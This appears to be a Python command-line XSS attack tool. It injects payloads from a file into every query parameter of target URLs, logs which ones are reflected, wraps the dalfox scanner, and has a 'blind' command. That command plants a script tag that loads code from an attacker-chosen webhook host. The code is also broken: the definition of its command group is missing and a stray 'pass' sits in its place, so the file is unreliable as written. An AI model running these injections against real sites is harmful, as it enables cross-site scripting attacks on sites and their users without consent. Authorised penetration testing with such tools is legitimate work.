#!/usr/bin/env python3

import os
import sys
import sqlite3
import shutil
import subprocess
import json
import csv
import urllib.parse
from datetime import datetime
from pathlib import Path

import click
import httpx

HOME = str(Path.home())
RECON_DIR = os.path.join(HOME, ".reconcli")
DB_PATH = os.path.join(RECON_DIR, "xsscli.db")
DEFAULT_PAYLOADS = os.path.join(os.path.dirname(__file__), "payloads", "xss-default.txt")
BINARIES = ["dalfox", "gf", "playwright", "curl", "jq", "qsreplace", "kxss", "waybackurls", "unfurl", "linkfinder", "paramspider", "xsstrike"]

os.makedirs(RECON_DIR, exist_ok=True)

    pass

@cli.command()
def check_deps():
    """Check for required external binaries."""
    print("[i] Checking external binaries:")
    for binary in BINARIES:
        if shutil.which(binary) is None:
            print(f"[!] Missing: {binary}")
        else:
            print(f"[+] Found: {binary}")

# ========== DB INIT / UTILS ==========

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS results (
        id INTEGER PRIMARY KEY,
        url TEXT,
        param TEXT,
        payload TEXT,
        reflected INTEGER,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS resume (
        url TEXT PRIMARY KEY
    )''')
    conn.commit()
    conn.close()

def save_to_db(url, param, payload, reflected):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO results (url, param, payload, reflected, timestamp) VALUES (?, ?, ?, ?, ?)",
              (url, param, payload, int(reflected), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def load_payloads(payload_file):
    with open(payload_file, 'r') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def mark_done(url):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM resume WHERE url=?", (url,))
    conn.commit()
    conn.close()

def save_to_resume(url):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO resume (url) VALUES (?)", (url,))
        conn.commit()
    except:
        pass
    conn.close()

def load_resume_urls():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT url FROM resume")
    urls = [r[0] for r in c.fetchall()]
    conn.close()
    return urls

# ========== CORE COMMANDS ============

@cli.command()
@click.option('-u', '--url', required=True, help='Target URL or file with URLs')
@click.option('--payloads', default=DEFAULT_PAYLOADS, help='Payloads file')
@click.option('--storedb', is_flag=True, help='Store results in local DB')
@click.option('--resume', is_flag=True, help='Mark URL done in resume DB')
@click.option('--timeout', default=10, help='Request timeout')
def inject(url, payloads, storedb, resume, timeout):
    """Inject payloads into parameters and check reflection."""
    init_db()
    payloads = load_payloads(payloads)
    targets = []

    if os.path.isfile(url):
        with open(url) as f:
            targets = [line.strip() for line in f if line.strip()]
            for t in targets:
                save_to_resume(t)
    else:
        targets = [url]
        save_to_resume(url)

    for url in targets:
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in query:
            for payload in payloads:
                new_query = query.copy()
                new_query[param] = payload
                full_url = base + "?" + urllib.parse.urlencode(new_query, doseq=True)
                try:
                    r = httpx.get(full_url, timeout=timeout)
                    reflected = payload in r.text
                    print(f"{'[!]' if reflected else '[-]'} {param}={payload} -> {full_url}")
                    if storedb:
                        save_to_db(full_url, param, payload, reflected)
                except Exception as e:
                    print(f"[!] Error: {e}")
        if resume:
            mark_done(url)

@cli.command()
@click.option('-u', '--url', required=True, help='Target URL or file')
@click.option('--webhook', required=True, help='Blind XSS webhook')
def blind(url, webhook):
    """Send blind XSS payloads."""
    init_db()
    targets = []
    if os.path.isfile(url):
        with open(url) as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [url]

    for url in targets:
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        for param in query:
            payload = f"<script src=//{webhook}></script>"
            new_query = query.copy()
            new_query[param] = payload
            full_url = base + "?" + urllib.parse.urlencode(new_query, doseq=True)
            print(f"[*] Sending to {full_url}")
            try:
                httpx.get(full_url, timeout=5)
            except:
                pass

@cli.command()
@click.option('-u', '--url', required=True, help='Target URL or file')
def dalfox(url):
    """Run dalfox scanner."""
    if shutil.which("dalfox") is None:
        print("[!] dalfox not in PATH")
        return
    targets = []
    if os.path.isfile(url):
        with open(url) as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [url]

    for u in targets:
        subprocess.run(["dalfox", "url", u])

@cli.command("resume-clear")
def resume_clear():
    init_db()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM resume")
    conn.commit()
    conn.close()
    print("[*] Cleared resume DB")

@cli.command("resume-stat")
def resume_stat():
    init_db()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM resume")
    count = c.fetchone()[0]
    print(f"[*] Resume queue: {count} URLs")
    conn.close()

if __name__ == '__main__':
    cli()
